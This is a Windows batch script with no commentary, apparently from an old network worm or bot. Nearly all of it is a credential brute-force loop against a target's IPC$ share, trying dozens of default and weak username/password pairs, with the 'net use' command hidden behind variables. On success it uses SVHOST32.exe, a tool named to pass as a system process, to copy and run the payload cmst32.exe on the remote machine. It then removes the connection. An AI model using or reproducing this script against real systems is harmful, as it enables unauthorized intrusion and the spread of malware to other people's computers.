   @echo off
   set n=net
   set u=use
   set e=errorlevel
   set px=ipc$
   set heh=Administrator
   cd\
   cd C:\WINNT
   cd system32
   net use \\%1\ipc$ "" /user:Administrator
   if not errorlevel 1 goto root
   %n% %u% \\%1\%px% "" /user:
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "%heh%" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:administrateur
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "%heh%" /user:Admin
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "admin" /user:
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "123" /user:
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:admin
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "admin" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "admin" /user:Admin
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "administrateur" /user:administrateur
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:Guest
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "admin123" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "1" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "12" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "123" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "12345" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "secret" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "mail" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "test" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:Owner
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "temp" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "temp123" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "pass" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "password" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:Administrador
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "123" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "321" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "12345" /user:%heh%
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:root
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "root" /user:root
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:Server
   if not %e% 1 goto root
   %n% %u% \\%1\%px% "" /user:wwwadmin
   %n% %u% \\%1\%px% "" /user:database
   %n% %u% \\%1\%px% "" /user:test
   %n% %u% \\%1\%px% "" /user:root
   %n% %u% \\%1\%px% "" /user:server
   %n% %u% \\%1\%px% "12345" /user:
   %n% %u% \\%1\%px% "user" /user:
   %n% %u% \\%1\%px% "admin" /user:wwwadmin
   %n% %u% \\%1\%px% "wwwadmin" /user:wwwadmin
   %n% %u% \\%1\%px% "database" /user:database
   %n% %u% \\%1\%px% "admin" /user:database
   %n% %u% \\%1\%px% "user" /user:user
   %n% %u% \\%1\%px% "admin" /user:user
   %n% %u% \\%1\%px% "admin" /user:%heh%
   %n% %u% \\%1\%px% "admin123" /user:%heh%
   %n% %u% \\%1\%px% "password" /user:administrato
   %n% %u% \\%1\%px% "changeme" /user:%heh%
   %n% %u% \\%1\%px% "private" /user:%heh%
   %n% %u% \\%1\%px% "root" /user:root
   %n% %u% \\%1\%px% "12" /user:%heh%
   %n% %u% \\%1\%px% "123" /user:%heh%
   %n% %u% \\%1\%px% "1234" /user:%heh%
   %n% %u% \\%1\%px% "12345" /user:%heh%
   %n% %u% \\%1\%px% "123456" /user:%heh%
   %n% %u% \\%1\%px% "secret" /user:%heh%
   %n% %u% \\%1\%px% "test" /user:test
   %n% %u% \\%1\%px% "test123" /user:test
   :root
   SVHOST32.exe \\%1 -f -c -d cmst32.exe
   SVHOST32.exe \\%1 -d cmst32.exe
   SVHOST32.exe \\%1 -d cmst32.exe -o
   %n% %u% /del \\%1\%px%
